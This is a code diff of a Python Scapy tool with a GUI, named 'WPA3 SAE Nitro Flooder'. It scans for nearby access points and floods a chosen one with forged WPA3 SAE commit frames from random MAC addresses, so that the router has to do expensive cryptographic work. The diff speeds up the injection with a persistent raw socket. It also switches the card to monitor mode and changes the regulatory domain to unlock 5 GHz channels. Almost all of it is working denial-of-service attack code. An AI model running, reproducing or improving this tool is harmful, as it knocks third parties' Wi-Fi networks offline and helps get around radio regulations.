@@ -3,57 +3,59 @@ from scapy.all import *
 import tkinter as tk
 from tkinter import ttk
 
-class SAEFlooderSurgical:
+class SAENitroFlooder:
     def __init__(self, iface):
         self.iface = iface
-        self.discovered_aps = {} # BSSID: {SSID, CH, Signal}
+        self.discovered = {}
         self.running = True
         self.flooding = False
-        self.current_ch = 1
         
-        # Hardware Setup
-        self.lock_hardware()
-        self.allowed_channels = self.get_allowed_channels()
-        
-        # UI
-        self.root = tk.Tk()
-        self.root.title("SAE Commit Flooder & Multi-Band Scanner")
-        self.root.geometry("900x600")
-        self.root.configure(bg="#0a0a0a")
+        # 1. Unlock hardware and kill interference
+        self.prep_environment()
+        self.allowed_channels = self.get_channels()
+        self.build_gui()
 
-        # Table
-        self.tree = ttk.Treeview(self.root, columns=("SSID", "BSSID", "CH", "Signal"), show="headings")
-        for col in ("SSID", "BSSID", "CH", "Signal"): self.tree.heading(col, text=col)
-        self.tree.pack(fill="both", expand=True, padx=20, pady=20)
-
-        # Buttons
-        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
-        btn_frame.pack(pady=10)
-        
-        self.flood_btn = tk.Button(btn_frame, text="START SAE FLOOD", bg="#aa0000", fg="white", 
-                                   command=self.toggle_flood, font=("Arial", 10, "bold"))
-        self.flood_btn.pack(side="left", padx=10)
-        
-        tk.Button(btn_frame, text="REPAIR & EXIT", bg="#333", fg="#ff4444", command=self.shutdown).pack(side="left")
-
-        # Background Ops
-        threading.Thread(target=self.hopper, daemon=True).start()
-        threading.Thread(target=self.scanner, daemon=True).start()
-
-    def lock_hardware(self):
-        os.system("sudo iw reg set PH") # Unlock local 5GHz
+    def prep_environment(self):
+        print("[*] Locking hardware into Monitor Mode...")
+        os.system("sudo iw reg set PH") # Use PH or BO to unlock 5GHz
         os.system("sudo airmon-ng check kill > /dev/null 2>&1")
-        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")
+        os.system(f"sudo ip link set {self.iface} down")
+        os.system(f"sudo iw dev {self.iface} set type monitor")
+        os.system(f"sudo ip link set {self.iface} up")
 
-    def get_allowed_channels(self):
-        """Logic: Query the driver to support all 2.4G and 5G channels available."""
+    def get_channels(self):
         try:
-            cmd = f"iwlist {self.iface} freq"
-            output = subprocess.check_output(cmd, shell=True).decode()
-            return [int(line.split("Channel ")[1].split(":")[0]) for line in output.split("\n") if "Channel " in line]
-        except:
-            return [1, 6, 11] # Fallback
+            output = subprocess.check_output(f"iwlist {self.iface} freq", shell=True).decode()
+            return [int(l.split("Channel ")[1].split(":")[0]) for l in output.split("\n") if "Channel " in l]
+        except: return [1, 6, 11, 36, 44, 149, 157]
 
+    def nitro_flood(self, bssid, ch):
+        """High-Speed Injection Logic using Persistent L2 Sockets"""
+        os.system(f"sudo iw dev {self.iface} set channel {ch}")
+        
+        # PRE-CRAFT: Build the shell once to save CPU
+        # algo=3 (SAE), seqnum=1 (Commit)
+        base_pkt = (RadioTap() / 
+                    Dot11(addr1=bssid, addr3=bssid) / 
+                    Dot11Auth(algo=3, seqnum=1, status=0) / 
+                    Dot11Elt(ID=19, info=b"\x13\x00") / 
+                    Raw(load=b"\x00"*16))
+
+        # OPEN SOCKET: Direct hardware access
+        conf.verb = 0
+        s = conf.L2socket(iface=self.iface)
+        
+        print(f"[*] NITRO FLOOD STARTING ON BSSID: {bssid}")
+        while self.flooding:
+            # Randomize only the sender MAC
+            base_pkt.addr2 = RandMAC()
+            try:
+                # SEND: No socket overhead here
+                s.send(base_pkt) 
+            except: break
+        s.close()
+
+    # --- Scanner and GUI logic ---
     def hopper(self):
         i = 0
         while self.running:
@@ -65,53 +67,55 @@ class SAEFlooderSurgical:
             else: time.sleep(1)
 
     def scanner(self):
-        def callback(pkt):
+        def cb(pkt):
             if pkt.haslayer(Dot11Beacon):
-                bssid = pkt.addr3
-                ssid = pkt.info.decode(errors='ignore') or "Hidden"
-                stats = pkt.getlayer(Dot11Beacon).network_stats()
-                # We specifically look for WPA3 (SAE) or RSN tags
-                if bssid not in self.discovered_aps:
-                    self.discovered_aps[bssid] = {"SSID": ssid, "CH": self.current_ch, "Sig": pkt.dBm_AntSignal}
-                    self.update_ui()
-
-        sniff(iface=self.iface, prn=callback, store=0)
+                b = pkt.addr3
+                if b not in self.discovered:
+                    s = pkt.info.decode(errors='ignore') or "Hidden"
+                    self.discovered[b] = {"SSID": s, "CH": self.current_ch}
+                    self.root.after(0, self.update_ui)
+        sniff(iface=self.iface, prn=cb, store=0)
 
     def update_ui(self):
         for i in self.tree.get_children(): self.tree.delete(i)
-        for bssid, info in self.discovered_aps.items():
-            self.tree.insert("", "end", values=(info["SSID"], bssid, info["CH"], info["Sig"]))
+        for b, info in self.discovered.items():
+            self.tree.insert("", "end", values=(info["SSID"], b, info["CH"]))
 
     def toggle_flood(self):
         if not self.flooding:
             sel = self.tree.selection()
             if not sel: return
-            target = self.tree.item(sel[0])["values"] # SSID, BSSID, CH
             self.flooding = True
-            self.flood_btn.config(text="STOP FLOODING", bg="#555")
-            threading.Thread(target=self.flood_logic, args=(target,), daemon=True).start()
+            self.btn.config(text="STOP NITRO FLOOD", bg="#ff4444")
+            t = self.tree.item(sel[0])["values"]
+            threading.Thread(target=self.nitro_flood, args=(t[1], t[2]), daemon=True).start()
         else:
             self.flooding = False
-            self.flood_btn.config(text="START SAE FLOOD", bg="#aa0000")
+            self.btn.config(text="START NITRO FLOOD", bg="#00aa00")
 
-    def flood_logic(self, target):
-        ssid, bssid, ch = target[0], target[1], target[2]
-        os.system(f"sudo iw dev {self.iface} set channel {ch}")
-        
-        while self.flooding:
-            client = RandMAC()
-            # SAE Commit Frame: Force the router to do expensive ECC math 
-            pkt = (RadioTap() / 
-                   Dot11(addr1=bssid, addr2=client, addr3=bssid) / 
-                   Dot11Auth(algo=3, seqnum=1, status=0) / 
-                   Dot11Elt(ID=19, info=b"\x13\x00") / 
-                   Raw(load=b"\x01\x02\x03\x04" * 4))
-            sendp(pkt, iface=self.iface, count=20, inter=0.005, verbose=False)
+    def build_gui(self):
+        self.root = tk.Tk()
+        self.root.title("WPA3 SAE Nitro Flooder v9.8")
+        self.root.geometry("800x500")
+        self.root.configure(bg="#111")
+        self.tree = ttk.Treeview(self.root, columns=("SSID", "BSSID", "CH"), show="headings")
+        for c in ("SSID", "BSSID", "CH"): self.tree.heading(c, text=c)
+        self.tree.pack(fill="both", expand=True, padx=10, pady=10)
+        self.btn = tk.Button(self.root, text="START NITRO FLOOD", command=self.toggle_flood, bg="#00aa00", fg="white")
+        self.btn.pack(pady=5)
+        tk.Button(self.root, text="REPAIR WIFI & EXIT", command=self.repair_and_exit, bg="#333", fg="white").pack(pady=5)
+        threading.Thread(target=self.hopper, daemon=True).start()
+        threading.Thread(target=self.scanner, daemon=True).start()
 
-    def shutdown(self):
+    def repair_and_exit(self):
         self.running = False; self.flooding = False
-        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up")
+        print("[*] Restoring Managed Mode and NetworkManager...")
+        os.system(f"sudo ip link set {self.iface} down")
+        os.system(f"sudo iw dev {self.iface} set type managed")
+        os.system(f"sudo ip link set {self.iface} up")
+        os.system("sudo systemctl restart NetworkManager")
         self.root.destroy()
 
 if __name__ == "__main__":
-    SAEFlooderSurgical(sys.argv[1]).root.mainloop()
+    if len(sys.argv) < 2: print("Usage: sudo python3 nitro.py [iface]")
+    else: SAENitroFlooder(sys.argv[1]).root.mainloop()
